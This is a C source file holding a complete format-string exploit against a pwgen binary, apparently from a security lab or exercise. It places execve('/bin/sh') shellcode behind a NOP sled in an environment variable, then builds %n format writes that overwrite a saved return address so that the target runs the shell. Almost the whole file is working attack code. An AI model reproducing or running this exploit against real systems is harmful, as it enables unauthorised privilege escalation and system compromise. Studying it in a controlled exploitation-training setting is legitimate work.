#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

#define NOP 0x90

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(){
	__asm__("movl %esp, %eax");
}

int main(int argc, char* argv[]){
	char *buff, *ptr, *egg;
       	unsigned long addr_egg, *addr_ptr;
	int offset = 0, bsize = 1024;
	int i, eggsize = 2048;	
	char *newargv[] = {"/usr/local/bin/pwgen", "-h", NULL};
	char *newenv[] = { NULL, NULL, NULL};
	char exename[] = "/usr/local/bin/pwgen";
	//The position that stores the return address of print_usage
	//add an 'A' to fit the 4byte boundary "Usage:  ".
	char addr[] = 
		"AAAAA""\xfc\xd3\xbf\xff"
		"BBBB""\xfd\xd3\xbf\xff"
		"CCCC""\xfe\xd3\xbf\xff"
		"DDDD""\xff\xd3\xbf\xff";
	char format_pad[] = "%08x.";
	char buffer_str[50];

	unsigned long write_byte, already_written=75, padding;
	unsigned long addr_egg_array[4];
	
	if(argc >1) bsize = atoi(argv[1]);
	if(argc >2) offset = atoi(argv[2]);
	if(argc >3)eggsize = atoi(argv[3]);

	if(!(buff = malloc(bsize)))
	{
		printf("Can't malloc.\n");
		exit(0);
	}
	if(!(egg=malloc(eggsize))){
		printf("Can't malloc.\n");
		exit(0);
	}

	//Prepare the format str with the return address position to tamper
	addr_ptr = (long*)ptr;
	memcpy(buff, addr, strlen(addr)); 

	ptr = buff+strlen(addr);
	for(i=0; i < 7; i++){
		memcpy(ptr,format_pad, strlen(format_pad));
		ptr += strlen(format_pad);
	}
	//Calbulate the address the egg shell may be
	addr_egg = get_sp() - offset;
	printf("Using address: 0x%x\n", addr_egg);

	//Calculate the proper format padding for "%xxxu%n"s
	i = 0;
	while(addr_egg != 0)
	{
		addr_egg_array[i] = addr_egg % 0x100;
		addr_egg /= 0x100;

		i++;
	}
	//The magic number of the character the printf has printed at the padding position in the pwgen.
	already_written = 103;

	for(i=0;i < 4; i++)
	{
		write_byte = addr_egg_array[i];
		already_written %= 0x100;
		padding = (write_byte - already_written)%0x100;
		if(padding < 10)
			padding += 0x100;
		memset(buffer_str, 0, sizeof(buffer_str));
		sprintf(buffer_str, "%%%iu%%n", padding);
		memcpy(ptr, buffer_str, strlen(buffer_str));
		ptr += strlen(buffer_str);
		already_written += padding;
	}
	
	//Prepare the egg shell.
	ptr = egg;
	for(i=0; i < eggsize - strlen(shellcode) - 1;i++)
		*(ptr++) = NOP;

	for(i=0; i < strlen(shellcode);i++)
		*(ptr++) = shellcode[i];

	buff[bsize-1] = '\0';
	egg[eggsize-1] = '\0';	
	memcpy(egg, "EGG=", 4);


	newenv[0] = egg;
	putenv(egg);
	newargv[0] = buff;
	execve(exename, newargv, newenv);
	perror("execve");
	exit(0);
}

